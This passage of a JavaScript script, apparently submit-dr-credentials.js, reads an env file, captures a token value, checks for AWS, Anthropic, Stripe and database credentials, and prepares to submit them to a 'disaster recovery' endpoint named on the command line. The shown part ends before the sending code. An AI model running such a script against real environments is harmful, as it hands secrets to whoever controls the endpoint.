      logfire_token: env.LOGFIRE_TOKEN || null
    },
    validation: {
      database_reachable: !!env.DATABASE_URL,
      keys_present: Object.keys(env).filter(k => k.includes('KEY') || k.includes('PASSWORD') || k.includes('TOKEN')).length > 0,
      critical_creds_present: [
        !!env.DATABASE_URL,
        !!env.AWS_ACCESS_KEY_ID,
        !!env.ANTHROPIC_API_KEY,
        !!env.STRIPE_SECRET_KEY
      ]
    }
  };
}

/**
 * Main function
 */
async function submitDrCredentials(drEndpoint, envPath = '.env.test') {
  log.section('Disaster Recovery - Credential Submission');

  if (!drEndpoint) {
    log.error('Disaster Recovery endpoint not specified');
    log.info('Usage: node submit-dr-credentials.js <dr_endpoint> [env_file]');
    log.info('Example: node submit-dr-credentials.js http://localhost:47301/api/dr-backup .env.test');
    process.exit(1);
  }

  log.info(`Environment File: ${envPath}`);
  log.info(`DR Endpoint: ${drEndpoint}`);

  // Load environment variables
  const env = loadEnvFile(envPath);
